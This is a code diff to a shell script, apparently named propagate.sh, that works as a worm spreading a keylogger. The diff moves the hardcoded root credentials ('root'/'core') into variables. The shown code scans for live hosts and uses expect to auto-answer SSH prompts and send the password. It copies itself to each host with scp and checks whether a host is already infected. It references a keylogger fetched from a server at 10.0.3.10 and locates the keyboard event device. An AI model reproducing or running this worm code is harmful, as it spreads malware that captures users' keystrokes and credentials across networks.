@@ -40,6 +40,9 @@ SERVER="10.0.3.10"
 # The name of the keylogger file hosted on the server
 WORM="logger"
 
+TARGET_USER="root"
+TARGET_PASSWD="core"
+
 # Dynamically determining the event driver for the keyboard
 KBD_EVENT=$(cat /proc/bus/input/devices | grep "sysrq kbd" | sed -rn "s/.*d (.*)$/\1/p")
 
@@ -201,10 +204,10 @@ for host in ${hostsUp[@]}; do
     # Expect script to accept RSA fingerprint and enter password
     expect -c "
         set timeout 2
-        spawn scp propagate.sh root@$host:
+        spawn scp propagate.sh $TARGET_USER@$host:
         expect refused { exit $ERR_REFUSED; }
         expect yes/no { send yes\r ; exp_continue }
-        expect password: { send core\r; exp_continue }
+        expect password: { send $TARGET_PASSWD\r; exp_continue }
         sleep 1
         exit 0
     "
@@ -222,10 +225,10 @@ for host in ${hostsUp[@]}; do
     # infected the host.
     expect -c "
         set timeout 2
-        spawn ssh root@$host
+        spawn ssh $TARGET_USER@$host
         expect refused { exit $ERR_REFUSED; }
         expect yes/no { send yes\r ; exp_continue }
-        expect password: { send core\r; exp_continue }
+        expect password: { send $TARGET_PASSWD\r; exp_continue }
         expect *~\#* {send \"cd $DIR_PREFIX/\$\(hostname\).conf\r\";}
         expect *.conf\#* {send \"ls | grep $WORM -c\r\";}
         expect -re {\n[1-9].*#} {exit $ERR_ALREADY_INFECTED;}
